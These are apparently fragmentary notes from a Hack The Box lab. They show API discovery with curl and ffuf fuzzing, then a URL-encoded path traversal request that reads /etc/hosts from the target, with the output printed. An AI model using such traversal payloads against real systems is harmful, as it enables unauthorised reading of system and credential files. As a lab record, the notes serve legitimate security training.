---
created: 2023-12-18T16:05:48 (UTC -08:00)
tags: []
...
```shell
p3ta@htb[/htb]$ curl http://<TARGET IP>:3000/api
{"status":"UP"}
```
...
```shell
p3ta@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
...
```shell
p3ta@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
...
```shell
p3ta@htb[/htb]$ curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
127.0.0.1 localhost
...
![[Pasted image 20231218160828.png]]

![[Pasted image 20231218161004.png]]

![[Pasted image 20231218161029.png]]

![[Pasted image 20231218161121.png]]

![[Pasted image 20231218161203.png]]